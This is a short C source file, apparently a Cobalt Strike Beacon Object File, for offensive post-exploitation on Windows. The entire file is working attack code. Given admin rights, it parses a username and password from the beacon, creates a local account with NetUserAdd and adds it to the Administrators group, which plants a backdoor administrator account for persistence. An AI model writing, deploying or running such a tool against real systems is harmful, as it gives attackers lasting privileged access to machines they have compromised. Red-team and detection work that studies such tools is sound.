#include <windows.h>
#include <stdio.h>
#include <lm.h>
#include "beacon.h"

 typedef DWORD NET_API_STATUS;

DECLSPEC_IMPORT NET_API_STATUS WINAPI NETAPI32$NetUserAdd(LPWSTR,DWORD,PBYTE,PDWORD);
DECLSPEC_IMPORT NET_API_STATUS WINAPI NETAPI32$NetLocalGroupAddMembers(LPCWSTR,LPCWSTR,DWORD,PBYTE,DWORD);

void go(char * args, int len) {
    if(!BeaconIsAdmin()){
           BeaconPrintf(CALLBACK_OUTPUT,"You must be a admin for this to work");
           return;
    }

    USER_INFO_1 UserInfo;
    DWORD dwLevel = 1;
    DWORD dwError = 0;

    wchar_t * username;
    wchar_t * password;
    datap parser;
    BeaconDataParse(&parser, args, len);
    username = (wchar_t *)BeaconDataExtract(&parser, NULL);
    password = (wchar_t *)BeaconDataExtract(&parser, NULL);

    if(username == NULL || password == NULL){
	BeaconPrintf(CALLBACK_ERROR, "Invalid argument...\n");
	return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "username: %ls\n", username);
    BeaconPrintf(CALLBACK_OUTPUT, "password: %ls\n", password);


    UserInfo.usri1_name = username;
    UserInfo.usri1_password = password;
    UserInfo.usri1_priv = USER_PRIV_USER;
    UserInfo.usri1_home_dir = NULL;
    UserInfo.usri1_comment = NULL;
    UserInfo.usri1_flags = UF_SCRIPT;
    UserInfo.usri1_script_path = NULL;

    NET_API_STATUS nStatus;

    nStatus = NETAPI32$NetUserAdd(
        NULL,
        dwLevel,
        (LPBYTE)&UserInfo,
        &dwError
        );
    if(nStatus == NERR_Success){
        BeaconPrintf(CALLBACK_OUTPUT, "User %ls has been successfully added", username);
    }else{
        BeaconPrintf(CALLBACK_OUTPUT, "User added error %d", nStatus);
    }

    LOCALGROUP_MEMBERS_INFO_3 account;
    account.lgrmi3_domainandname = UserInfo.usri1_name;

    NET_API_STATUS aStatus;

    aStatus = NETAPI32$NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1);
    if(aStatus == NERR_Success){
        BeaconPrintf(CALLBACK_OUTPUT, "User has been successfully added to Administrators", NULL);
    }else{
        BeaconPrintf(CALLBACK_OUTPUT, "User added to Administrators error ", NULL);
    }
}
